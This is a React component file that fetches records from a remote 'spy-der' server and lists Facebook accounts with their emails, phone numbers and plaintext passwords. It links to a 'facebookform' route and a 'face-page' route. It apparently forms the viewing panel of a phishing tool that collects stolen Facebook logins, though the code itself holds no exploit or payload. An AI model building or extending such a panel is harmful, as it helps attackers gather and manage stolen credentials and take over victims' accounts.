// Facebook.jsx

import { useState, useEffect } from 'react'
import axios from 'axios'
import MyAccordion from '../Modules/MyAccordion'
import AddIcon from '@mui/icons-material/Add';
import MyFab from '../Modules/MyFab'
import { Link } from 'react-router-dom';
import Loading from '../Modules/MyLoading';

const Facebook = () => {
  const [data, setData] = useState([])
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    axios.get('https://spy-der.onrender.com/facebook')
      .then(res => {
        setData(res.data)
      })
      .catch(err => {
        console.log(err)
      })

      setTimeout(() => {
        setLoading(false)
      },"")
  }, [])

  if(loading){
    return (
      <div className='flex justify-center items-center'>
        <Loading title={"Facebook"} />
      </div>
    );
  }


  return (
    <div className='flex flex-col w-full '>
      <h1 className="text-2xl text-white italic underline my-3 p-2 text-center"> /Facebook &#10629; {data !== undefined && data !== null ? data.length : "waiting..."} &#10632;   </h1>
      <div className="absolute flex space-x-4 md:right-10 md:top-20 bottom-10 right-8">
        <Link className='m-2'  to="/facebookform">
          <MyFab>
            <AddIcon />
          </MyFab>
        </Link>
        <Link className='m-2' to="/face-page">
          <MyFab color="error">
            <AddIcon />
          </MyFab>
        </Link>
      </div>
      
      <div className='h-96 mt-8 overflow-y-auto'>
        {data.map((account) => (
          <div key={account._id} className='p-2 space-y-3'>
            <MyAccordion for="facebook" data={data} emailOrMobile={account.emailOrMobile} setData={setData} email={account.email} password={account.password} id={account._id} />
          </div>
        ))}
      </div>
    </div>
  )
}

export default Facebook